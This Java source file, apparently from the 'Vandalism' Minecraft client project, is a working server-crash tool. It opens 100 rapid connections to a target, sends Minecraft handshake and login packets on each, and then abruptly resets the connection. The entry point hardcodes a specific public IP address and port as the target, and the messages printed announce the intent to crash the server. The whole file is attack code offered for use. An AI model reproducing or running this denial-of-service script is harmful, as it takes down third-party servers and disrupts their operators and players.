/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

import net.minecraft.client.network.ServerAddress;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main {

    public static void main(String[] args) {
        instantCrash("5.249.164.50:42069");
    }
    
    public static void instantCrash(final String ipPort) {
        if (ipPort.equals("0") || ipPort.equals("127.0.0.1") || ipPort.equals("localhost") || ipPort.equals("0.0.0.0")) {
            return;
        }
        String hostname = ipPort;
        if (hostname.contains(":")) hostname = hostname.split(":")[0];
        if (!hostname.isEmpty()) {
            System.out.println("Trying to crash the Server...");
            new Thread(() -> {
                final ServerAddress resolver = ServerAddress.parse(ipPort);
                final String ip = resolver.getAddress();
                final int port = resolver.getPort();
                final String username = "GommeHD";
                final int connections = 100;
                final int protocolVersion = 47;
                final AtomicBoolean success = new AtomicBoolean(false);
                for (int i = 0; i < connections; ++i) {
                    try {
                        final Socket connection = new Socket(ip, port);
                        connection.setTcpNoDelay(true);
                        final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                        writePacket(createHandshakePacket(ip, port, protocolVersion), output);
                        writePacket(createLoginPacket(username), output);
                        connection.setSoLinger(true, 0);
                        connection.close();
                        success.set(true);
                    } catch (final Exception ignored) {
                    }
                }
                if (success.get()) {
                    System.out.println("Server should be crashed.");
                } else {
                    System.out.println("Failed to crash the Server!");
                }
            }).start();
        } else {
            System.out.println("Invalid IP or Domain!");
        }
    }

    public static byte[] createLoginPacket(final String username) throws IOException {
        final ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, username);
        final byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static void writeHandshakePacket(final DataOutputStream out, final String ip, final int port, final int protocolVersion, final int state) throws IOException {
        writeVarInt2(out, 0);
        writeVarInt2(out, protocolVersion);
        writeString(out, ip);
        out.writeShort(port);
        writeVarInt2(out, state);
    }

    public static byte[] createHandshakePacket(final String ip, final int port, final int protocolVersion) throws IOException {
        final ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocolVersion, 2);
        final byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static void writeVarInt2(final DataOutputStream out, int value) throws IOException {
        while ((value & -128) != 0) {
            out.writeByte(value & 127 | 128);
            value >>>= 7;
        }
        out.writeByte(value);
    }

    public static void writeVarInt(final DataOutputStream out, int paramInt) throws IOException {
        while (true) {
            if ((paramInt & 0xFFFFFF80) == 0) {
                out.writeByte(paramInt);
                return;
            }
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
    }

    public static void writePacket(final byte[] packetData, final DataOutputStream out) throws IOException {
        writeVarInt2(out, packetData.length);
        out.write(packetData);
    }

    public static void writeString(final DataOutputStream out, final String value) throws IOException {
        final byte[] data = value.getBytes(StandardCharsets.UTF_8);
        writeVarInt2(out, data.length);
        out.write(data, 0, data.length);
    }
    
}
